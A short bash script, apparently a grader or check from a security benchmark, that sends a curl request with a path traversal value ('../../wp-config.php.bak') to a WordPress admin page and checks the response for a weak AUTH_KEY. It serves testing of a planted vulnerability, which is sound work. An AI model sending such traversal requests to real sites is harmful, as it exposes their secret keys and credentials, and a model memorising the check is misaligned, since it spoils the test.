#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/wp-admin/admin.php?page=bench_tasks&view=../../wp-config.php.bak" | grep -q "AUTH_KEY='weak-salt'"
